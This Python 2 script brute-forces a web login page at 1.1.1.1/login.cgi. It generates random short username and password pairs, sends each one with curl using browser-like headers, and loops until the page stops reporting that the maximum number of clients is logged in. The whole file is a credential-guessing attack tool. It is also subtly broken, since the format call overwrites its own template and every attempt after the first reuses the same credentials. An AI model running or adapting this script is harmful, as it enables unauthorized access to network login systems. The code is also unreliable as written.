'''
Created on Sep 14, 2016

@author: lefterav
'''

import subprocess
import logging
import time

commandline = "curl 'http://1.1.1.1/login.cgi?username={}&password={}&t=&send=Auth' -H 'Host: 1.1.1.1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0' -H 'Accept: */*' -H 'Accept-Language: en,el;q=0.7,de;q=0.3' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://1.1.1.1/auth_login_downframe.htm' -H 'Connection: keep-alive'"
from random import randint, seed

failed = True
processed = set()

if __name__ == '__main__':
    
    while failed:
        seed()
        username = "".join([chr(randint(97, 122)) for _ in range(4)])
        password = []
        for _ in range(4):
            i = randint(87,122)
            if i<97:
                i = i-39
            
            password.append(chr(i))
        password = "".join(password)
        
        if (username, password) in processed:
            logging.warn("{},{} hit again".format(username, password))
        else:
            processed.add((username, password))
        
            commandline = commandline.format(username, password)
            output = subprocess.check_output(commandline, shell=True)
            failed = "alert('Maximum clients logged-in.');"  in output
            print username, password
            time.sleep(0.5)
    print output
        